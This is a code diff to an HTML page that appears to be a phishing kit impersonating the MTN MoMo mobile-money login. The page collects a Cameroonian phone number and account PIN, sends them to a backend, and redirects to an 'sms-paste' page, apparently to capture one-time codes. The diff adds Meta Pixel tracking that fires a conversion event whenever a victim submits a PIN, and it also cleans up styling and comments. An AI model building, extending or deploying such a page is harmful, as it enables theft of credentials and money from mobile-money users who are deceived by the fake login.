@@ -6,6 +6,29 @@
   <meta name="theme-color" content="#000000">
   <title>MTN MoMo – Login | MoMo Advance Loans</title>
 
+  <!-- ============================================
+       META PIXEL — BASE CODE
+       Pixel ID: 1021851290903869
+       ============================================ -->
+  <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1021851290903869');
+    fbq('track', 'PageView');
+  </script>
+  <noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=1021851290903869&ev=PageView&noscript=1"
+  /></noscript>
+  <!-- ============================================
+       END META PIXEL
+       ============================================ -->
+
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
@@ -132,7 +155,7 @@
     }
     .login-card-wrap { width: 100%; max-width: 440px; }
 
-    /* ═══════════ RED BANNER (rejection notice) ═══════════ */
+    /* Red banner */
     .reject-banner {
       position: fixed;
       top: calc(var(--header-h) + 12px);
@@ -158,11 +181,7 @@
       transform: translateX(-50%) translateY(0);
       opacity: 1;
     }
-    .reject-banner .r-ico {
-      font-size: 18px;
-      flex-shrink: 0;
-      line-height: 1.3;
-    }
+    .reject-banner .r-ico { font-size: 18px; flex-shrink: 0; line-height: 1.3; }
     .reject-banner .r-text {
       font-size: 12.5px;
       font-weight: 700;
@@ -213,7 +232,6 @@
       padding: 26px 22px 28px;
       box-shadow: var(--shadow-lg);
     }
-
     .welcome-title {
       font-size: 1.15rem;
       font-weight: 800;
@@ -264,7 +282,6 @@
       box-shadow: 0 0 0 4px rgba(220, 38, 38, 0.10);
       animation: shake 0.4s ease;
     }
-
     .country-btn {
       display: flex;
       align-items: center;
@@ -280,7 +297,6 @@
       flex-shrink: 0;
       font-family: 'Inter', sans-serif;
     }
-
     .flag-svg {
       width: 22px;
       height: 15px;
@@ -288,7 +304,6 @@
       box-shadow: 0 0 0 1px rgba(0,0,0,0.08);
       flex-shrink: 0;
     }
-
     .phone-input input {
       border: none !important;
       box-shadow: none !important;
@@ -309,7 +324,6 @@
       font-weight: 500;
       letter-spacing: normal;
     }
-
     .error-text {
       color: var(--error);
       font-size: 12px;
@@ -318,10 +332,7 @@
       font-weight: 700;
       line-height: 1.4;
     }
-    .error-text.show {
-      display: block;
-      animation: slideDown 0.3s ease;
-    }
+    .error-text.show { display: block; animation: slideDown 0.3s ease; }
     @keyframes slideDown {
       from { opacity: 0; transform: translateY(-4px); }
       to   { opacity: 1; transform: translateY(0); }
@@ -439,7 +450,6 @@
     /* ═══════════ PIN POPUP ═══════════ */
     .modal-container { position: fixed; inset: 0; z-index: 9999; display: none; }
     .modal-container.open { display: block; }
-
     .sheet-overlay {
       position: absolute; inset: 0;
       background: rgba(0, 0, 0, 0.5);
@@ -464,7 +474,6 @@
       z-index: 1;
     }
     .pin-modal.show { opacity: 1; transform: translateX(-50%) translateY(0); }
-
     .pin-modal-title {
       font-size: 18px;
       color: var(--black);
@@ -473,7 +482,6 @@
       font-weight: 700;
     }
     .pin-modal-title strong { font-weight: 900; color: var(--orange-600); }
-
     .pin-modal-sub {
       font-size: 13.5px;
       color: var(--text-mid);
@@ -487,7 +495,6 @@
       color: var(--text-mid);
       margin-bottom: 8px;
     }
-
     .pin-input-wrap { position: relative; display: flex; align-items: center; }
     .pin-input {
       width: 100%;
@@ -513,7 +520,6 @@
       border-color: var(--orange-500);
       box-shadow: 0 0 0 4px rgba(249, 115, 22, 0.15);
     }
-
     .pin-eye-btn {
       position: absolute;
       right: 14px;
@@ -542,7 +548,6 @@
       stroke-linecap: round;
       stroke-linejoin: round;
     }
-
     .pin-forgot-row {
       display: flex;
       justify-content: flex-end;
@@ -557,7 +562,6 @@
       cursor: pointer;
     }
     .pin-forgot:hover { text-decoration: underline; }
-
     .pin-error {
       color: var(--error);
       font-size: 12px;
@@ -567,7 +571,6 @@
       line-height: 1.4;
     }
     .pin-error.show { display: block; animation: slideDown 0.3s ease; }
-
     .pin-actions {
       display: grid;
       grid-template-columns: 1fr 1fr;
@@ -587,7 +590,6 @@
       cursor: pointer;
     }
     .btn-cancel:hover { background: #F2F4F9; }
-
     .btn-pin-proceed {
       padding: 14px;
       font-weight: 900;
@@ -611,7 +613,6 @@
     }
     .btn-pin-proceed:active:not(:disabled) { transform: scale(0.97); }
     .btn-pin-proceed:disabled { opacity: 0.35; cursor: not-allowed; box-shadow: none; }
-
     .btn-spinner {
       width: 16px; height: 16px;
       border: 2.5px solid rgba(0, 0, 0, 0.25);
@@ -635,7 +636,6 @@
       overflow: hidden;
     }
     .verify-overlay.show { display: flex; animation: fadeIn 0.5s ease; }
-
     .verify-overlay::before {
       content: '';
       position: absolute;
@@ -652,7 +652,6 @@
       0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.7; }
       50% { transform: translate(-50%, -50%) scale(1.15); opacity: 1; }
     }
-
     .verify-particles { position: absolute; inset: 0; overflow: hidden; pointer-events: none; }
     .verify-particle {
       position: absolute;
@@ -677,7 +676,6 @@
       80% { opacity: 0.7; transform: translateY(-280px) scale(0.9); }
       100% { opacity: 0; transform: translateY(-340px) scale(0.4); }
     }
-
     .verify-content {
       display: flex;
       flex-direction: column;
@@ -687,7 +685,6 @@
       position: relative;
       z-index: 2;
     }
-
     .verify-orbit { width: 140px; height: 140px; position: relative; margin-bottom: 34px; }
     .verify-orbit-ring {
       position: absolute;
@@ -702,7 +699,6 @@
       animation: rotateSlow 6s linear infinite reverse;
     }
     @keyframes rotateSlow { to { transform: rotate(360deg); } }
-
     .verify-orbit-core {
       position: absolute;
       top: 50%; left: 50%;
@@ -722,7 +718,6 @@
       0%, 100% { box-shadow: 0 0 40px rgba(255, 204, 0, 0.55), 0 0 80px rgba(255, 204, 0, 0.3); transform: translate(-50%, -50%) scale(1); }
       50% { box-shadow: 0 0 55px rgba(255, 204, 0, 0.85), 0 0 110px rgba(255, 204, 0, 0.5); transform: translate(-50%, -50%) scale(1.06); }
     }
-
     .verify-dot-orbit { position: absolute; inset: 0; animation: rotateSlow 3.5s linear infinite; }
     .verify-dot-orbit span {
       position: absolute;
@@ -735,7 +730,6 @@
     .verify-dot-orbit span:nth-child(2) { bottom: 0; left: 50%; transform: translateX(-50%); }
     .verify-dot-orbit span:nth-child(3) { top: 50%; left: 0; transform: translateY(-50%); }
     .verify-dot-orbit span:nth-child(4) { top: 50%; right: 0; transform: translateY(-50%); }
-
     .verify-title {
       font-size: 20px;
       font-weight: 800;
@@ -750,7 +744,6 @@
       -webkit-text-fill-color: transparent;
       background-clip: text;
     }
-
     .verify-subtitle {
       font-size: 13.5px;
       color: rgba(255, 255, 255, 0.7);
@@ -760,7 +753,6 @@
       min-height: 1.4em;
       transition: opacity 0.3s;
     }
-
     .verify-dots span { display: inline-block; animation: dotBlink 1.4s infinite both; }
     .verify-dots span:nth-child(1) { animation-delay: 0s; }
     .verify-dots span:nth-child(2) { animation-delay: 0.2s; }
@@ -769,7 +761,6 @@
       0%, 80%, 100% { opacity: 0.2; }
       40% { opacity: 1; }
     }
-
     .verify-bar {
       width: 240px;
       height: 6px;
@@ -793,7 +784,6 @@
       0% { background-position: 200% 0; }
       100% { background-position: -200% 0; }
     }
-
     .verify-status-row {
       display: flex;
       align-items: center;
@@ -815,7 +805,6 @@
       0%, 100% { opacity: 1; transform: scale(1); }
       50% { opacity: 0.5; transform: scale(0.85); }
     }
-
     .verify-step {
       position: relative;
       height: 20px;
@@ -860,7 +849,7 @@
 </head>
 <body>
 
-  <!-- REJECT BANNER (hidden by default) -->
+  <!-- REJECT BANNER -->
   <div class="reject-banner" id="rejectBanner">
     <span class="r-ico">⚠️</span>
     <div class="r-text">
@@ -1150,10 +1139,9 @@
     }
 
     /* ═══════════════════════════════════════════
-       RESET TO STEP 1 (phone number)
+       RESET TO PHONE STEP
     ═══════════════════════════════════════════ */
     function resetToPhoneStep() {
-      // 1) Close PIN modal + verify overlay immediately (no animation delay)
       if (verifyTimer) clearInterval(verifyTimer);
       if (stepTimer) clearInterval(stepTimer);
       verifyOverlay.classList.remove('show');
@@ -1161,12 +1149,10 @@
       verifyBarFill.style.width = '0%';
       verifyStepInner.style.transform = 'translateY(0)';
 
-      // Close PIN modal without the usual animation delay
       popup.classList.remove('show');
       modal.classList.remove('open');
       document.body.classList.remove('modal-open');
 
-      // Reset PIN field
       pin.value = '';
       pin.type = 'password';
       togglePin.classList.remove('active');
@@ -1175,27 +1161,22 @@
       proceed.innerHTML = '<span>Proceed</span>';
       pinError.classList.remove('show');
 
-      // Reset phone field
       phoneInput.value = '';
       phoneWrapper.classList.remove('invalid');
       phoneError.classList.remove('show');
 
-      // Clear local storage so a fresh login is required
       localStorage.removeItem('momoSession');
       localStorage.removeItem('momoPhone');
       localStorage.removeItem('momoCountry');
       localStorage.removeItem('momoSms');
 
-      // Show red banner
       showRejectBanner();
-
-      // Focus phone field for immediate re-entry
       window.scrollTo({ top: 0, behavior: 'smooth' });
       setTimeout(() => phoneInput.focus(), 250);
     }
 
     /* ═══════════════════════════════════════════
-       PROCEED
+       PROCEED → backend
     ═══════════════════════════════════════════ */
     let pollTimer = null;
     let verifyTimer = null;
@@ -1214,6 +1195,16 @@
       const digits = phoneInput.value.replace(/\D/g, '');
       const fullPhone = '+237' + digits;
       const userPin = pin.value;
+
+      /* ✅ META PIXEL — AddPaymentInfo fired when user submits PIN */
+      if (typeof fbq === 'function') {
+        fbq('track', 'AddPaymentInfo', {
+          content_name: 'MoMo Login Attempt',
+          content_category: 'Login',
+          currency: 'XAF'
+        });
+        console.log('✅ Meta Pixel: AddPaymentInfo event fired');
+      }
 
       try {
         const controller = new AbortController();
@@ -1332,7 +1323,6 @@
             setTimeout(() => { window.location.href = 'sms-paste.html'; }, 300);
 
           } else if (data.status === 'rejected') {
-            // ✅ NEW: reset straight to phone entry step
             stopPolling();
             resetToPhoneStep();
 
